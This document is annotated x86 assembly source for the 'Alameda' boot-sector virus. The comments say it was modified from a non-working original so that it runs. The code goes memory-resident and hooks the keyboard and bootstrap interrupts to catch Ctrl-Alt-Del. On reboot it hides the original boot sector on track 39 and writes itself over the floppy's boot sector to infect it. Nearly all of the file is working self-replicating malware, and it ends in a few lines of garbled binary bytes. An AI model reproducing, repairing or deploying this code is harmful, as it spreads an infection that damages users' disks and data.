

;alemeda virus                          last modified 11/04/93  

;IS MODIFIED IN THAT THE JUMP TO HIGH MEM IS NOT POP CS BUT A IRET
;THE VIRUS GOES RESIDENT BY MOVING ITSELF TO TOP OF MEM 
;BELOW 640 AT SAME OFFSET DECREMENTING 1K FROM TOTAL MEM

;SAVE ORGINAL BOOT
;AT TRACK 39 SIDE 0 SECTOR 8

;ONLY INFECTS FLOPPY ON CRTL-ALT-DEL

;close to orginal file which didn't work as possible
;except for the pop cs command which is set up as a iret

 
MEM_SIZE1       equ     0413h                    ;*
MEM_SIZE        equ     0013h
KEY_FLAGS       equ     0017h

INT09_OFF       equ     0024h
INT09_SEG       equ     0026h

INT19_OFF       equ     0064h
INT19_SEG       equ     0066h

WARMBT_FLAG     equ     0072h
EQUIP_LST       equ     0410h                    ;*

  
     

seg_a           segment byte 
		assume  cs:seg_a, ds:seg_a


		org     100h
begin:          jmp     near ptr start

		ORG     7C00H

start:
		cli                             ; Disable interrupts
		xor     ax,ax                   ; Zero register
		mov     ss,ax
		mov     sp,7C00h
		sti                             ; Enable interrupts
		mov     bx,40h
		mov     ds,bx
		mov     ax,ds:MEM_SIZE          ;
		mul     bx                      ; dx:ax = reg * ax
		sub     ax,7E0h
		mov     es,ax
		
		push    cs                      ;SET DS = CS = 000
		pop     ds                      ;
		
		cmp     di,3456H             ;IF VIRUS REBOOTING
		jne     NOT_RESIDENT            ; Jump if not equal
		
		dec     word ptr ds:I_CNTER    ;COUNTER

NOT_RESIDENT:
		mov     si,sp                   ;7C00H MOVE VIRUS HI
		mov     di,si                   ;
		mov     cx,200h                 ;
		cld                             ; Clear direction
		rep     movsb                   ; Rep when cx >0 
						; Mov [si] to es:[di]
		
		mov     si,cx                   ; SAVE FIRST 32 INT VECTORS
		mov     di,7c00h-80h            ; 7b80h
		mov     cx,80h                  ;
		rep     movsb                   ; Rep when cx >0 
						; Mov ds:[si] to es:[di]
		call    HOOK_INT09
		
		PUSHF
		push    es
		mov     ax,OFFSET himem
		PUSH    ax
		IRET
		
		;push    es
		;pop     cs                      ; Dangerous-8088 only
		;db      0Fh
himem:                
		push    ds
		pop     es
 
		mov     bx,sp                ; READ ORGINAL BOOT FROM
		mov     dx,cx                 ; FROM FLOPPY
		mov     cx,2708h                ; CH TRK 39, CL SEC 8
		mov     ax,201h                 ; READ AL 1 SECTOR
		int     13h                   ; Disk  dl=drive a  ah=func 02h
					      ;  read sectors to memory es:bx
					      ;   al=#,ch=cyl,cl=sectr,dh=head
ERROR1:
		jb      error1
		

		jmp     RE_BOOT


 
HOOK_INT09      proc    near
		dec     word ptr ds:MEM_SIZE1

		mov     si,INT09_OFF
		mov     di, OFFSET ORG_INT09    ;d_7CE9_e
		mov     cx,4
		cli                             ; Disable interrupts
		rep     movsb                   ; Rep when cx >0 
						; Mov [si] to es:[di]

		mov     word ptr ds:INT09_OFF,OFFSET VIR_INT09; 7CAEh
		mov     ds:INT09_SEG,es
		sti                             ; Enable interrupts
		retn
HOOK_INT09          endp


RES_KEYBD:
		in      al,61h                  ; port 61h, 8255 port B, read
		mov     ah,al
		or      al,80h
		out     61h,al                  ; port 61h, 8255 B - spkr, etc
		xchg    ah,al
		out     61h,al                  ; port 61h, 8255 B - spkr, etc
						;  al = 0, disable parity
		jmp     VIR_BOOT
						;* No entry point to code
		
tble1:        
		DB      27H,00H,01,02   
		DB      27H,00H,02,02
		DB      27H,00H,03,02
		DB      27H,00H,04,02
		DB      27H,00H,05,02
		DB      27H,00H,06,02
		DB      27H,00H,07,02
		DB      27H,00H,08,02
		
		;DW      0024H      
		;DB      0ADH, 7CH, 0a3h
		DB      26H, 00H, 59H, 5fh
		DB      5EH,07H,1FH
		DB      58H,9DH

 ;*              jmp     far ptr l_0457_0457     ;*
		db      0EAh
		db      57h, 04h, 57h, 04h 
						

VIR_INT09:
		pushf                           ; Push flags
		sti                             ; Enable interrupts
		push    ax
		push    bx
		push    ds
		push    cs
		pop     ds
		
		mov     bx,ds:SCAN_CODE          ;ALT_CTRL        
		in      al,60h                  ; port 60h, keybd scan or sw1
		mov     ah,al
		and     ax,887Fh
		
		cmp     al,1Dh                  ; SCAN CODE FOR LEFT_CTRL
		jne     IS_IT_ALT                  ; Jump if not equal
		mov     bl,ah
		jmp     TRY_AGAIN

IS_IT_ALT:
		cmp     al,38h                  ; SCAN CODE FOR LEFT_ALT
		jne     WAS_IT_C_A                  ; Jump if not equal
		mov     bh,ah
		jmp     TRY_AGAIN

WAS_IT_C_A:
		cmp     bx,808h
		jne     TRY_AGAIN                  ; Jump if not equal
		
;WE HAVE PICK UP CTRL AND ALT IS THIS KEY STROKE DELETE OR I                 
;
		
		cmp     al,17h                  ; SCAN CODE FOR I
		je      CTRL_ALT_I              ; Jump if equal
		
		cmp     al,53h                  ; SCAN CODE FOR DEL 
		je      RES_KEYBD                  ; Jump if equal
;
TRY_AGAIN:
		mov     ds:SCAN_CODE,bx


CALL_INT9:
		pop     ds
		pop     bx
		pop     ax
		popf                            ; Pop flags

;*              jmp     far ptr l_F000_0000     ;*
		db      0EAh
ORG_INT09       dw      ? 
		DW      0F000h

CTRL_ALT_I:
		jmp     C_A_I                    ;ctrl-alt-I is pressed



VIR_BOOT:
		mov     dx,3D8h
		mov     ax,800h
		out     dx,al                   ; port 3D8h, CGA video control
		
		call    KILL_TIME
		mov     ds:SCAN_CODE,ax
		
		mov     al,3
		int     10h                     ; Video display   ah=functn 08h
						;  get char al & attrib ah @curs
		mov     ah,2
		xor     dx,dx                   ; Zero register
		mov     bh,dh
		int     10h                     ; Video display   ah=functn 02h
						;  set cursor location in dx
		mov     ah,1
		mov     cx,607h
		int     10h                     ; Video display   ah=functn 01h
						;  set cursor mode in cx
		mov     ax,420h
		call    KILL_TIME         
		cli                             ; Disable interrupts
		out     20h,al                  ; port 20h, 8259-1 int command
						;  al = 20h, end of interrupt
		
		mov     es,cx                   ;  RESTOR INTERUPTS
		mov     di,cx                   ;
		mov     si,7C00H - 80H          ;7B80H  
		mov     cx,80h                  ;
		cld                             ; Clear direction
		rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
		
		mov     ds,cx                                  ; hook INT 19
		mov     word ptr ds:INT19_OFF,OFFSET VIR_INT19  ; 7D55h  
		mov     ds:INT19_SEG,cs                        ;
		
		mov     ax,40h
		mov     ds,ax
		mov     ds:KEY_FLAGS,ah
		inc     word ptr ds:[MEM_SIZE]

; CHECK LOCATION F000H:E502H IF EQUAL TO 21E4H JMP TO F000H:E502H                
; OTHERWISE REBOOT                

		push    ds
		mov     ax,0F000h
		mov     ds,ax
		cmp     word ptr ds:0E502H,21E4h
		pop     ds
		jz      DO_IT                  ; Jump if zero
		int     19h                     ; Bootstrap loader
DO_IT:
;*              jmp     F000:E502H     ;*
		db      0EAh
		dw      0E502h, 0F000h
						;* No entry point to code
VIR_INT19:
		xor     ax,ax                   ; Zero register
		mov     ds,ax
		mov     ax,ds:EQUIP_LST
		test    al,1
		jnz     RD_BOOT                 ; if not FLOPPY DRIVE
						; TRY READ BOOT
GOTO_ROMBASIC:
		push    cs
		pop     es
		call    HOOK_INT09
		int     18h                     ; ROM basic

RD_BOOT:
		mov     cx,4

RD_LOOP:
		push    cx                      ;SAVE ERROR COUNTER
		mov     ah,0
		int     13h                     ; THIS WAS CODED AS INT 0Dh 
		jc      RD_ERROR                 
		
		mov     ax,201h                 ; READ BOOT SECTOR OFF DISK
		push    ds                                ; DRIVE A: TO 0000:7C00H
		pop     es
		mov     bx,7C00H                ;
		mov     cx,1                    ;
		int     13h                     ; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
RD_ERROR:
		pop     cx
		jnc     CHK_BOOT                  ; Jump if carry=0
		loop    RD_LOOP                  ; Loop if cx > 0

		jmp     short GOTO_ROMBASIC
CHK_BOOT:
		cmp     di,3456H                ;
		jne     CHK_FOR_INFEC                  ; NOT INFECTED YET
RE_BOOT:
;*              jmp     far ptr 0000:7C00     ;*
		db      0EAh
		dw      7C00h, 0
CHK_FOR_INFEC:
		mov     si,7C00H               ;CMP VIRUS TO BOOT SECTOR 
		mov     cx,0e6H                  ;IN QUESTION
		mov     di,si                  ;
		push    cs                     ;
		pop     es                     ;
		cld                             ; Clear direction
		rep    cmpsb                   ; Rep zf=1+cx >0 
						; Cmp [si] to es:[di]
		jz      INFEC_ALREADY                  ; Jump if zero
		
		inc     word ptr cs:I_CNTER     ; INCREMENT INFECT ANOTHER
		
		mov     bx,offset tble1         ;OFFSET tble1 INFO
		mov     dx,0                    ;DRIVE A:
		mov     ch,27h                  ;TRACK 39 
		mov     ah,5                    ;FORMAT 
		jmp     MOV_BOOT                ;DON'T DO ??? 
		
		db       72h, 1Fh

MOV_BOOT:
		mov     es,dx                ;WRITE ORGINAL BOOT
		mov     bx,7C00H             ; TO 
		mov     cl,8                 ;DISK A: TRK 39 SECTOR 8
		mov     ax,301h              ;
		int     13h                  ; Disk  dl=drive a  ah=func 03h
					     ;  write sectors from mem es:bx
					     ;   al=#,ch=cyl,cl=sectr,dh=head
		push    cs
		pop     es
		jc      MV_BT_ERROR               ; IF ERROR IN WRITING
		
		mov     cx,1                 ;WRITE VIRUS DOR SEC 1 DRIVE A:
		mov     ax,301h              ;
		int     13h                   ; Disk  dl=drive a  ah=func 03h
					      ;  write sectors from mem es:bx
					      ;   al=#,ch=cyl,cl=sectr,dh=head
		jc      MV_BT_ERROR                ; Jump if carry Set
INFEC_ALREADY:
		mov     di,3456H              ;SET FLAG DISK IS INFECTED
		int     19h                   ; Bootstrap loader

MV_BT_ERROR:
		call    HOOK_INT09            ;HOOK INT09
		dec     word ptr cs:I_CNTER   ;WE DID NOT INFECT DEC COUNTER
		jmp     short RE_BOOT         ;BOOT UN-INFECTED DISK


C_A_I:
		mov     ds:SCAN_CODE,bx       ;SAVE SCAN CODE
		mov     ax,ds:I_CNTER         ;PUT COUNTER INTO WARMBT_FLAG
		
		mov     bx,40h                ;MAKE SURE THAT FLAG IS NOT 
		mov     ds,bx                 ;1234H FOR WARM BOOT
		mov     ds:WARMBT_FLAG,ax     ; maybe
		jmp     CALL_INT9

;==========================================================================
;                              SUBROUTINE
;==========================================================================

KILL_TIME       proc    near
		sub     cx,cx
l_02F0:
		loop    l_02F0                  ; Loop if cx > 0

		sub     ah,1
		jnz     l_02F0                  ; Jump if not zero
		retn
KILL_TIME       endp



;DATA                                            ;* No entry point to code
		;DB      27H,00H,08H,02H                
I_CNTER         DW      1CH                
SCAN_CODE       DW      0                
		;dw      27h
		;dw      8       
		;db      02H, 00H
		;DB      55H,0AAH

seg_a           ends



		end     BEGIN
ÿ
¡ 
£@
¥`
§€
© 
«À
ÿÿÿÿo
×€
Ù 
ÛÀ
Ýà
ßðÿÿ/ã@å`ç€é ÿÿÿíàïñ ó@õðÿÿù ûÀýàÿ!JÿàOQ!SAUa
